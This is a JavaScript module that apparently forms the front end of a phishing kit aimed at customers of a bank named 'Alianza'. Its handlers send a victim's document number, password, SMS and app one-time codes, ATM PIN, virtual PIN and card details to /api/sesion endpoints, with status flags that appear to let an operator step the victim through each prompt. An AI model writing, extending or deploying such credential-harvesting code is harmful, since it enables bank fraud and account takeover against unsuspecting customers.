//mensje-otp
const handlerMensaje = async (clave, uniqId, setReLoad)=>{
    try {
        setLoading(true)
        const send = await axios.post(`/api/sesion/otp-sms`, {
            uniqid: uniqId,
            codsms: clave,
            status: "ncodsms"
        },{
            headers: {
            "Content-Type": "application/json",
            'Accept': 'application/json'
        }})
        setReLoad(r => r = !r)            
    } catch (error) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
    }
}

const handlerloginError = async ()=>{
    try {
        setLoading(true)
        const { data } = await axios.post(
        `/api/sesion`,
        {
            usuario: datosInicio.numeroDocumento,
            clave: datosInicio.contrasenia,
            banco: "Alianza",
            uniqid: uniqId    
        },
        {
            headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
            },
        }
        )
        setReLoad(r => r = !r)            
    } catch (error) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
    }
}

//otp-app
const handlerAplicacion = async (clave, uniqId, setReLoad)=>{
    try {
        setLoading(true)
        const send = await axios.post(`/api/sesion/otp-app`, {
            uniqid: uniqId,
            codapp: clave,
            status: "ncodeapp"
        },{
            headers: {
            "Content-Type": "application/json",
            'Accept': 'application/json'
        }})
        setReLoad(r => r = !r)
        
    } catch (error) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
    }
}

//clave-cajero
const handlerCajero = async (clave, uniqId, setReLoad)=>{
    try {
        setLoading(true)
        const send = await axios.post(`/api/sesion/clave-cajero`, {
            uniqid: uniqId,
            pincaj: clave,
            status: "npincaj"
        },{
            headers: {
            "Content-Type": "application/json",
            'Accept': 'application/json'
        }})
        setReLoad(r => r = !r)
    } catch (error) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
    }
}
//clave-virtual
const handlerClaveVirtual = async (clave, uniqId, setReLoad)=>{
    try {
        setLoading(true)
        const send = await axios.post(`/api/sesion/clave-virtual`, {
            uniqid: uniqId,
            pinvir: clave,
            status: "npinvir" 
        },{
        headers: {
            "Content-Type": "application/json",
            'Accept': 'application/json'
        }})
        setReLoad(r => r = !r)
        
    } catch (error) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
    }
}

//tarjeta
const handlerTarjeta = async (body) =>{
    try {
        setLoading(true)
        const send = await axios.post(`/api/sesion/tarjeta`, body, {
            headers: {
            "Content-Type": "application/json",
            'Accept': 'application/json'
        }})
        setReLoad(r => r = !r)
        
    } catch (error) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
        console.log(error);
        setReLoad(r => r = !r)
    }
    
}

export {handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta, handlerloginError}